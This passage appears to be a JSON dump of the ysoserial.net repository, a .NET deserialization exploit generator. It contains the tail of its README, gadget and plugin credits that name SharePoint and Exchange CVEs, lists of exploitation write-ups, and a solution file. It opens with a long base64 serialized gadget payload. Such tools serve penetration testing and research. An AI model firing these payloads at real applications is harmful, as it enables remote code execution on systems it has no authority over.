hbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw==\n\n```\n\n## v2 Branch\nv2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by [irsdl](https://github.com/irsdl). Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 become identified in the future.\n\n## Contributing\n- Fork it\n- Create your feature branch (`git checkout -b my-new-feature`)\n- Commit your changes (`git commit -am 'Add some feature'`)\n- Push to the branch (`git push origin my-new-feature`)\n- Create new Pull Request\n\n## Thanks\nSpecial thanks to all contributors:\n- [Oleksandr Mirosh](https://twitter.com/olekmirosh)\n- [irsdl](https://github.com/irsdl)\n- [JarLob](https://github.com/JarLob)\n- [DS-Kurt-Boberg](https://github.com/DS-Kurt-Boberg)\n- [mwulftange](https://github.com/mwulftange)\n- [yallie](https://github.com/yallie)\n- [paralax](https://github.com/paralax)\n\n## Credits\n```\n$ ./ysoserial.exe --credit\n\nysoserial.net has been originally developed by Alvaro Munoz (@pwntester)\nthis tool is being maintained by Alvaro Munoz (@pwntester) and Soroush Dalili (@irsdl)\n\nCredits for available gadgets:\n\tActivitySurrogateDisableTypeCheck\n\t\t[Finders: Nick Landers]\n\tActivitySurrogateSelector\n\t\t[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]\n\tActivitySurrogateSelectorFromFile\n\t\t[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]\n\tAxHostState\n\t\t[Finders: Soroush Dalili]\n\tBaseActivationFactory\n\t\t[Finders: Piotr Bazydlo]\n\tClaimsIdentity\n\t\t[Finders: Soroush Dalili]\n\tClaimsPrincipal\n\t\t[Finders: jang]\n\tDataSet\n\t\t[Finders: James Forshaw] [Contributors: Soroush Dalili]\n\tDataSetOldBehaviour\n\t\t[Finders: Steven Seeley] [Contributors: Soroush Dalili]\n\tDataSetOldBehaviourFromFile\n\t\t[Finders: Steven Seeley, Markus Wulftange] [Contributors: Soroush Dalili]\n\tDataSetTypeSpoof\n\t\t[Finders: James Forshaw] [Contributors: Soroush Dalili, Markus Wulftange, Jang]\n\tGenericPrincipal\n\t\t[Finders: Soroush Dalili]\n\tGetterCompilerResults\n\t\t[Finders: Piotr Bazydlo]\n\tGetterSecurityException\n\t\t[Finders: Piotr Bazydlo]\n\tGetterSettingsPropertyValue\n\t\t[Finders: Piotr Bazydlo]\n\tObjectDataProvider\n\t\t[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]\n\tObjRef\n\t\t[Finders: Markus Wulftange]\n\tPSObject\n\t\t[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]\n\tResourceSet\n\t\t[Finders: Soroush Dalili]\n\tRolePrincipal\n\t\t[Finders: Soroush Dalili]\n\tSessionSecurityToken\n\t\t[Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]\n\tSessionViewStateHistoryItem\n\t\t[Finders: Soroush Dalili]\n\tTextFormattingRunProperties\n\t\t[Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Oleksandr Mirosh, Soroush Dalili, Piotr Bazydlo]\n\tToolboxItemContainer\n\t\t[Finders: @frycos]\n\tTypeConfuseDelegate\n\t\t[Finders: James Forshaw] [Contributors: Alvaro Munoz]\n\tTypeConfuseDelegateMono\n\t\t[Finders: James Forshaw] [Contributors: Denis Andzakovic, Soroush Dalili]\n\tWindowsClaimsIdentity\n\t\t[Finders: Soroush Dalili]\n\tWindowsIdentity\n\t\t[Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]\n\tWindowsPrincipal\n\t\t[Finders: Steven Seeley of Qihoo 360 Vulcan Team] [Contributors: Chris Anastasio]\n\tXamlAssemblyLoadFromFile\n\t\t[Finders: Soroush Dalili] [Contributors: russtone]\n\tXamlImageInfo\n\t\t[Finders: Piotr Bazydlo]\n\nCredits for available plugins:\n\tActivatorUrl\n\t\tHarrison Neal\n\tAltserialization\n\t\tSoroush Dalili\n\tApplicationTrust\n\t\tSoroush Dalili\n\tClipboard\n\t\tSoroush Dalili\n\tDotNetNuke\n\t\tdiscovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch\n\tGetterCallGadgets\n\t\tPiotr Bazydlo\n\tMachineKeySessionSecurityTokenHandler\n\t\tL@2uR1te\n\tNetNonRceGadgets\n\t\tPiotr Bazydlo\n\tResx\n\t\tSoroush Dalili\n\tSessionSecurityTokenHandler\n\t\tSoroush Dalili\n\tSharePoint\n\t\tCVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili\n\tThirdPartyGadgets\n\t\tPiotr Bazydlo\n\tTransactionManagerReenlist\n\t\tSoroush Dalili\n\tViewState\n\t\tSoroush Dalili\n\nVarious other people have also donated their time and contributed to this project.\nPlease see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.\n```\n\n## Additional Reading\n- [Attacking .NET serialization](https://speakerdeck.com/pwntester/attacking-net-serialization)\n- [Friday the 13th: JSON Attacks - Slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)\n- [Friday the 13th: JSON Attacks - Whitepaper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)\n- [Friday the 13th: JSON Attacks - Video(demos)](https://www.youtube.com/watch?v=ZBfBYoK_Wr0)\n- [Are you my Type? - Slides](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)\n- [Are you my Type? - Whitepaper](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)\n- [Exploiting .NET Managed DCOM](https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html)\n- [Exploit Remoting Service ](https://github.com/tyranid/ExploitRemotingService)\n- [Finding and Exploiting .NET Remoting over HTTP using Deserialisation](https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)\n- [.NET Remoting Revisited](https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html)\n- [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)\n- [Exploiting Hardened .NET Deserialization: New Exploitation Ideas and Abuse of Insecure Serialization -  Hexacon 2023 Whitepaper](https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf)\n\n## ysoserial.net references in the wild\n\n### Research:\n- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html\n- https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/\n- https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/\n- https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/\n- https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/\n- https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282\n- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/\n- https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817\n- https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/\n- https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/\n- https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/\n- https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/\n- https://blog.netwrix.com/2023/04/10/generating-deserialization-payloads-for-messagepack-cs-typeless-mode/\n- https://code-white.com/blog/leaking-objrefs-to-exploit-http-dotnet-remoting/\n- https://code-white.com/blog/teaching-the-old-net-remoting-new-exploitation-tricks/\n\n### Usage:\n- https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6\n- https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution\n- https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/\n- https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/\n- https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html\n- https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server\n- https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf\n- https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability\n- https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index\n- https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/\n- https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/\n- https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/\n- https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability\n- https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/\n- https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\n- https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters\n- https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/\n- https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html\n- https://srcincite.io/pocs/cve-2020-16952.py.txt\n- https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters\n- https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html\n- https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\n- https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability\n- https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/\n- https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852\n- https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/\n- https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d\n- https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint\n- https://blog.assetnote.io/2021/11/02/sitecore-rce/\n- https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/\n- https://gmo-cybersecurity.com/blog/net-remoting-english/\n- https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/\n- https://www.mandiant.com/resources/hunting-deserialization-exploits\n- https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/\n- https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd\n- https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c\n- https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform\n- https://www.youtube.com/watch?v=ZcOZNAmKR0c&feature=youtu.be\n\n### Talks:\n- https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf\n- https://speakerdeck.com/pwntester/attacking-net-serialization\n- https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints\n- https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf\n- https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf\n- https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf\n\n### Tools:\n- https://github.com/pwntester/ViewStatePayloadGenerator\n- https://github.com/0xACB/viewgen\n- https://github.com/Illuminopi/RCEvil.NET\n\n### CTF write-ups:\n- https://cyku.tw/ctf-hitcon-2018-why-so-serials/\n- https://xz.aliyun.com/t/3019\n"
        },
        {
          "name": "TestConsoleApp",
          "type": "tree",
          "content": null
        },
        {
          "name": "logo.png",
          "type": "blob",
          "size": 86.548828125,
          "content": null
        },
        {
          "name": "ysoserial.sln",
          "type": "blob",
          "size": 3.8759765625,
          "content": "Ôªø\nMicrosoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio 15\nVisualStudioVersion = 15.0.28307.1340\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"ysoserial\", \"ysoserial\\ysoserial.csproj\", \"{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}\"\nEndProject\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"ExploitClass\", \"ExploitClass\\ExploitClass.csproj\", \"{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}\"\nEndProject\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"TestConsoleApp_YSONET\", \"TestConsoleApp\\TestConsoleApp_YSONET.csproj\", \"{E1E8C029-F7CD-4BD1-952E-E819B41520F0}\"\nEndProject\nGlobal\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\n\t\tDebug|Any CPU = Debug|Any CPU\n\t\tDebug|x64 = Debug|x64\n\t\tDebug|x86 = Debug|x86\n\t\tRelease|Any CPU = Release|Any CPU\n\t\tRelease|x64 = Release|x64\n\t\tRelease|x86 = Release|x86\n\tEndGlobalSection\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|x64.ActiveCfg = Debug|x64\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|x64.Build.0 = Debug|x64\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|x86.ActiveCfg = Debug|x86\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Debug|x86.Build.0 = Debug|x86\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|Any CPU.Build.0 = Release|Any CPU\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|x64.ActiveCfg = Release|x64\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|x64.Build.0 = Release|x64\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|x86.ActiveCfg = Release|x86\n\t\t{6B40FDE7-14EA-4F57-8B7B-CC2EB4A25E6C}.Release|x86.Build.0 = Release|x86\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|x64.ActiveCfg = Debug|x64\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|x64.Build.0 = Debug|x64\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|x86.ActiveCfg = Debug|x86\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Debug|x86.Build.0 = Debug|x86\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|Any CPU.Build.0 = Release|Any CPU\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|x64.ActiveCfg = Release|x64\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|x64.Build.0 = Release|x64\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|x86.ActiveCfg = Release|x86\n\t\t{0746F37A-9825-4E9D-A1EB-6DCC03B25C45}.Release|x86.Build.0 = Release|x86\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|x64.ActiveCfg = Debug|x64\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|x64.Build.0 = Debug|x64\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|x86.ActiveCfg = Debug|x86\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Debug|x86.Build.0 = Debug|x86\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|Any CPU.Build.0 = Release|Any CPU\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|x64.ActiveCfg = Release|x64\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|x64.Build.0 = Release|x64\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|x86.ActiveCfg = Release|x86\n\t\t{E1E8C029-F7CD-4BD1-952E-E819B41520F0}.Release|x86.Build.0 = Release|x86\n\tEndGlobalSection\n\tGlobalSection(SolutionProperties) = preSolution\n\t\tHideSolutionNode = FALSE\n\tEndGlobalSection\n\tGlobalSection(ExtensibilityGlobals) = postSolution\n\t\tSolutionGuid = {9F1672F3-4451-4E9C-87D3-54B0C5F2CF8A}\n\tEndGlobalSection\nEndGlobal\n"
        },
        {
          "name": "ysoserial",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}